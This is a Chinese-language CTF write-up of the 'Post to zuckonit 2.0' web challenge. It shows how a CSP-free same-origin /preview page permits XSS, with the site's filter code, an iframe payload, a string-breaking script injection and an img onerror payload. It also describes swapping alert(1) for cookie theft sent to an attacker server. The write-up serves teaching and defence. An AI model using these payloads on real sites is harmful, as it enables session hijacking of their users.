# Post to zuckonit 2.0

## 题目简述

主页面允许提交内容给管理员机器人访问，但响应头设置了严格 CSP：`default-src 'self'; script-src 'self'`。内联脚本和外域脚本均不能在主页面执行，同时后端只允许形似 `<iframe src="...">` 的标签。突破口是同源的 `/preview` 页面没有 CSP，并且其替换功能会把用户输入放入 JavaScript 或保留原标签的尖括号。

## 解题过程

主页面的过滤逻辑大致为：

```python
def escape_index(original):
    content = original
    content_iframe = re.sub(
        r"^(<?/?iframe)\s+.*?(src=[\"'][a-zA-Z/]{1,8}[\"']).*?(>?)$",
        r"\1 \2 \3",
        content,
    )
    if content_iframe != content or re.match(
        r"^(<?/?iframe)\s+(src=[\"'][a-zA-Z/]{1,8}[\"'])$", content
    ):
        return content_iframe
    return re.sub(r"<*/?(.*?)>?", r"\1", content)
```

因此主页面直接提交 `<script>`、事件属性或内联 JavaScript 都会失败，但下面的同源 iframe 可以通过：

```html
<iframe src="preview">
```

`/preview` 页面本身没有 CSP。官方题解记录了两条可行的非预期路径。

第一种路径利用模板中的：

```javascript
let replacement = "{{ replacement | safe }}"
div.innerHTML = data[i].replace(substr, replacement)
```

`replacement` 使用 `safe` 原样进入双引号字符串，后端又没有过滤双引号。把替换内容设为：

```javascript
";alert(1);//
```

生成的脚本会先闭合字符串，再执行 `alert(1)`。实际攻击时把 `alert(1)` 换成向受控服务器发送 `document.cookie` 的代码，最后让机器人访问包含 `<iframe src="preview">` 的主页面即可。

第二种路径不依赖闭合 JavaScript 字符串。先在主页提交 `<iframe src="preview">`，再利用替换功能把其中的字符串 `iframe` 替换为：

```html
img src=x onerror=alert(1)
```

原 iframe 的 `<`、`>` 被保留下来，最终形成可执行的 `<img src=x onerror=...>`。同样将 `alert(1)` 改为 Cookie 外带逻辑，再提交给管理员机器人。

官方 PDF 用浏览器弹窗截图证明两条路径，截图中的输入和结果已经全部转成上述文本；动态 flag 没有保存在文档中。

## 方法总结

CSP 是按响应生效的，父页面的策略不能替代 `/preview` 自己缺失的策略；只要允许嵌入同源 iframe，就必须继续审计子页面。字符串替换功能尤其危险：输入不仅可能进入 JavaScript 字符串，还可能借用原文本中的尖括号重新构造 HTML。分析时要同时追踪服务端过滤、模板转义、DOM sink 与各页面 CSP，而不是只看其中一层。
